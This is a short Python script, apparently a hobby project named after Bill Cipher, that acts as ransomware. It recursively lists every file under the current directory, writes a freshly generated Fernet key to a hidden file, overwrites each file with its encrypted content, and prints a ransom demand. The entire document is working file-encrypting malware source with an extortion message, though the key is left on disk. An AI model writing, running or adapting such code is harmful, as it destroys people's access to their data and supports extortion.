#!/usr/local/bin/python3 

import os
from cryptography.fernet import Fernet

os.system("pip install -r requirement.txt")

def find_files():
	files = []
	
	for file in os.listdir():
		if file == "bill-cipher.py" or file == ".a_deal" or file == "bill-decipher.py":
			continue
		
		if os.path.isfile(file):
			files.append(file)
		else:
			os.chdir(file)
			sub_files = find_files()
			os.chdir("..")
			for subfile in sub_files:
				path = file + "/" + subfile
				files.append(path)
			
	return files

files = find_files()

print(files)

key = Fernet.generate_key()

with open(".a_deal", "wb") as deal:
	deal.write(key)

for file in files:
	with open(file, "rb") as f:
		content = f.read()

	content_encrypted = Fernet(key).encrypt(content)

	with open(file, "wb") as f:
		f.write(content_encrypted)

print("Files are encrypted! Send me moneyyyyyyyyyyyyyyy")
